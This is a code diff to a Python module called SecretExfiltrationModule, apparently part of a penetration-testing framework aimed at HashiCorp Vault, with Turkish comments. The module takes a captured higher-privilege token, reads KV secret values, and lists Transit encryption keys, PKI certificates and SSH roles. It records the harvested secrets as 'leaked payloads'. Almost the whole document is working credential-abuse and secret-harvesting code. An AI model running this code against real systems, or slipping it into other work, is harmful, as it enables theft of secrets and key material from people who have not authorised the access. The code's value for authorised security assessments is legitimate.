@@ -22,7 +22,8 @@ class SecretExfiltrationModule(BaseExecutionModule):
             risk_level=RiskLevel.READ_ONLY,
             description=(
                 "Uses a previously captured higher-privilege token to enumerate "
-                "KV secret engines and read accessible secret values."
+                "KV secret engines and read accessible secret values. Also supports "
+                "Transit, PKI, and SSH engine enumeration."
             ),
             default_enabled=True,
         )
@@ -56,11 +57,13 @@ class SecretExfiltrationModule(BaseExecutionModule):
             headers["X-Vault-Namespace"] = namespace
 
         try:
-            mounts = _discover_kv_mounts(base_url, headers, timeout, verify_tls)
-            leaked_payloads = {}
+            all_findings = {}
             errors = []
 
-            for mount_name, mount_info in mounts.items():
+            # 1. KV Secret'ları oku (mevcut)
+            kv_mounts = _discover_kv_mounts(base_url, headers, timeout, verify_tls)
+            kv_payloads = {}
+            for mount_name, mount_info in kv_mounts.items():
                 kv_version = _kv_version(mount_info)
                 mount_path = mount_name.strip("/")
                 _walk_kv_mount(
@@ -73,37 +76,78 @@ class SecretExfiltrationModule(BaseExecutionModule):
                     "",
                     0,
                     max_depth,
-                    leaked_payloads,
+                    kv_payloads,
                     errors,
+                )
+            if kv_payloads:
+                all_findings["kv_secrets"] = kv_payloads
+
+            # 2. Transit Engine - Anahtarları listele
+            transit_keys = _list_transit_keys(base_url, headers, timeout, verify_tls)
+            if transit_keys:
+                all_findings["transit_keys"] = transit_keys
+                context.add_finding(
+                    title="HIGH: Transit Keys Discovered",
+                    description=f"Found {len(transit_keys)} Transit encryption keys.",
+                    severity="HIGH",
+                    evidence={"keys": transit_keys[:10]},
+                )
+
+            # 3. PKI Engine - Sertifikaları listele
+            pki_certs = _list_pki_certs(base_url, headers, timeout, verify_tls)
+            if pki_certs:
+                all_findings["pki_certificates"] = pki_certs
+                context.add_finding(
+                    title="HIGH: PKI Certificates Discovered",
+                    description=f"Found {len(pki_certs)} PKI certificates.",
+                    severity="HIGH",
+                    evidence={"certs": pki_certs[:10]},
+                )
+
+            # 4. SSH Engine - Rolleri listele
+            ssh_roles = _list_ssh_roles(base_url, headers, timeout, verify_tls)
+            if ssh_roles:
+                all_findings["ssh_roles"] = ssh_roles
+                context.add_finding(
+                    title="MEDIUM: SSH Roles Discovered",
+                    description=f"Found {len(ssh_roles)} SSH roles.",
+                    severity="MEDIUM",
+                    evidence={"roles": ssh_roles[:10]},
                 )
 
             evidence = {
                 "token_source": "captured_token",
-                "kv_mounts": sorted(mounts.keys()),
-                "total_leaked_secrets": len(leaked_payloads),
-                "leaked_payloads": leaked_payloads,
+                "kv_mounts": sorted(kv_mounts.keys()),
+                "total_kv_secrets": len(kv_payloads),
+                "leaked_payloads": kv_payloads,
+                "transit_keys_count": len(transit_keys),
+                "pki_certs_count": len(pki_certs),
+                "ssh_roles_count": len(ssh_roles),
+                "all_findings": all_findings,
                 "errors": errors[:20],
             }
 
-            if leaked_payloads:
+            total_findings = len(kv_payloads) + len(transit_keys) + len(pki_certs) + len(ssh_roles)
+            if total_findings > 0:
                 context.add_finding(
                     title="CRITICAL: Secret Exfiltration Successful",
                     description=(
-                        "Captured token could read accessible KV secret values "
-                        f"from {len(leaked_payloads)} path(s)."
+                        f"Captured token could read {total_findings} total items: "
+                        f"{len(kv_payloads)} KV secrets, {len(transit_keys)} Transit keys, "
+                        f"{len(pki_certs)} PKI certs, {len(ssh_roles)} SSH roles."
                     ),
                     severity="CRITICAL",
                     evidence=evidence,
                 )
                 return ExecutionResult(
                     status="success",
-                    message=f"Secret exfiltration succeeded for {len(leaked_payloads)} KV path(s).",
+                    message=f"Secret exfiltration succeeded for {total_findings} items.",
                     evidence=evidence,
                 )
 
             return ExecutionResult(
                 status="failed",
-                message="No readable KV secret values were found with the captured token.",
+                message="No readable secrets were found with the captured token.",
                 evidence=evidence,
             )
 
@@ -127,6 +171,8 @@ def _captured_token(context):
         or getattr(context, "escalated_token", None)
     )
 
+
+# ─── KV ──────────────────────────────────────────────────────────────────────
 
 def _discover_kv_mounts(base_url, headers, timeout, verify_tls):
     response = requests.get(
@@ -271,6 +317,116 @@ def _kv_version(mount_info):
     options = mount_info.get("options", {}) if isinstance(mount_info, dict) else {}
     return 2 if options.get("version") == "2" else 1
 
+
+# ─── TRANSIT ENGINE ──────────────────────────────────────────────────────────
+
+def _list_transit_keys(base_url, headers, timeout, verify_tls):
+    """Transit engine'deki tüm anahtarları listele"""
+    endpoint = f"{base_url}/v1/transit/keys"
+    response = requests.request(
+        "LIST",
+        endpoint,
+        headers=headers,
+        timeout=timeout,
+        verify=verify_tls,
+    )
+    if response.status_code != 200:
+        return []
+    
+    data = _safe_json(response)
+    keys = data.get("data", {}).get("keys", []) or []
+    return [str(key) for key in keys]
+
+
+# ─── PKI ENGINE ──────────────────────────────────────────────────────────────
+
+def _list_pki_certs(base_url, headers, timeout, verify_tls):
+    """PKI engine'deki tüm sertifikaları listele"""
+    # Önce PKI mount'larını bul
+    mounts = _discover_pki_mounts(base_url, headers, timeout, verify_tls)
+    all_certs = []
+    
+    for mount_path in mounts:
+        endpoint = f"{base_url}/v1/{mount_path.strip('/')}/certs"
+        response = requests.request(
+            "LIST",
+            endpoint,
+            headers=headers,
+            timeout=timeout,
+            verify=verify_tls,
+        )
+        if response.status_code == 200:
+            data = _safe_json(response)
+            certs = data.get("data", {}).get("keys", []) or []
+            all_certs.extend([f"{mount_path}{cert}" for cert in certs])
+    
+    return all_certs
+
+
+def _discover_pki_mounts(base_url, headers, timeout, verify_tls):
+    """PKI mount'larını keşfet"""
+    response = requests.get(
+        f"{base_url}/v1/sys/mounts",
+        headers=headers,
+        timeout=timeout,
+        verify=verify_tls,
+    )
+    if response.status_code != 200:
+        return []
+    
+    data = _safe_json(response).get("data", {})
+    return [
+        path
+        for path, info in data.items()
+        if isinstance(info, dict) and info.get("type") == "pki"
+    ]
+
+
+# ─── SSH ENGINE ──────────────────────────────────────────────────────────────
+
+def _list_ssh_roles(base_url, headers, timeout, verify_tls):
+    """SSH engine'deki tüm rolleri listele"""
+    # Önce SSH mount'larını bul
+    mounts = _discover_ssh_mounts(base_url, headers, timeout, verify_tls)
+    all_roles = []
+    
+    for mount_path in mounts:
+        endpoint = f"{base_url}/v1/{mount_path.strip('/')}/roles"
+        response = requests.request(
+            "LIST",
+            endpoint,
+            headers=headers,
+            timeout=timeout,
+            verify=verify_tls,
+        )
+        if response.status_code == 200:
+            data = _safe_json(response)
+            roles = data.get("data", {}).get("keys", []) or []
+            all_roles.extend([f"{mount_path}{role}" for role in roles])
+    
+    return all_roles
+
+
+def _discover_ssh_mounts(base_url, headers, timeout, verify_tls):
+    """SSH mount'larını keşfet"""
+    response = requests.get(
+        f"{base_url}/v1/sys/mounts",
+        headers=headers,
+        timeout=timeout,
+        verify=verify_tls,
+    )
+    if response.status_code != 200:
+        return []
+    
+    data = _safe_json(response).get("data", {})
+    return [
+        path
+        for path, info in data.items()
+        if isinstance(info, dict) and info.get("type") == "ssh"
+    ]
+
+
+# ─── ORTAK YARDIMCILAR ──────────────────────────────────────────────────────
 
 def _safe_json(response):
     try:
